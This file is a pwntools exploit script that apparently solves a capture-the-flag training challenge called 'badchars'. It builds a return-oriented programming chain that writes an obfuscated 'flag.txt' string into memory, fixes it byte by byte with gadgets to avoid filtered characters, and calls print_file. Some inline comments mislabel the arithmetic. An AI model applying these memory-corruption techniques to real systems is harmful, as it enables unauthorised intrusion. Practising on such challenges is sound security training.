#!/usr/bin/env python3

from pwn import *

exe = ELF("./badchars")

context.binary = exe
context.terminal = ["alacritty", "-e"]
gdb_script = """
b main
b *0x000000000040069c
continue
"""

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdbscript=gdb_script)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()
    # badchars: a g x .

    write_addr = 0x0000000000601038
    # [d3bo@archlinux badchars]$ readelf -S badchars | grep .bss
    #   [24] .bss              NOBITS           0000000000601038  00001038

    offset = 40
    pop_rdi = 0x00000000004006a3 # pop rdi ; ret
    add_byte_r15 = 0x000000000040062c # add byte ptr [r15], r14b ; ret
    sub_byte_r15 = 0x0000000000400630 # sub byte ptr [r15], r14b ; ret
    pop_r15 = 0x00000000004006a2 # pop r15 ; ret
    qword_r13_r12 = 0x0000000000400634 # mov qword ptr [r13], r12 ; ret
    pop_r12_pop_r13_pop_r14_pop_r15 = 0x000000000040069c # pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret


    payload = flat({offset: [
            pop_r12_pop_r13_pop_r14_pop_r15, "flbf-twt", write_addr, 0x01, 0x00,
                                            # flag.txt
            qword_r13_r12,

            # flbf-twt

            pop_r15, write_addr+2,  # b
            sub_byte_r15,           # b - 1 = a
            # flaf-twt

            pop_r15, write_addr+3,  # f
            add_byte_r15,           # f - 1 = g
            # flag-twt

            pop_r15, write_addr+4,  # -
            add_byte_r15,           # - - 1 = .
            # flag.twt

            pop_r15, write_addr+6,  # w
            add_byte_r15,           # w - 1 = x
            # flag.txt

            pop_rdi, write_addr,
            exe.plt["print_file"]
        ]})
    r.sendlineafter('>', payload)
    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()

